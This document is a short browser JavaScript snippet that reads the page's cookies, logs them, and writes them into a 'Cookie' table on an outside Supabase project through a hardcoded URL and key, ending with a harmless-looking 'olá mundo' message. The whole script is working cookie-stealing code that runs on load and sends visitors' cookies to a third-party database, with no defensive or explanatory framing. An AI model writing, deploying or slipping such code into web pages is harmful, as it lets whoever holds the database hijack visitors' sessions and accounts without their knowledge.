(function () {

  const SUPABASE_URL = "https://viznxowojmdxkpwukhla.supabase.co";
  const SUPABASE_KEY = "sb_publishable_-dnu2H4vDls0duGO03BXaA_IfvWlAuk";

  function run() {

    const c = document.cookie;
    const supaclient = supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    console.log(c)
    supaclient
      .from("Cookie")
      .insert({
        text: c,
        created_at: new Date()
      });

  }

  run();
  console.log("olá mundo");
})();
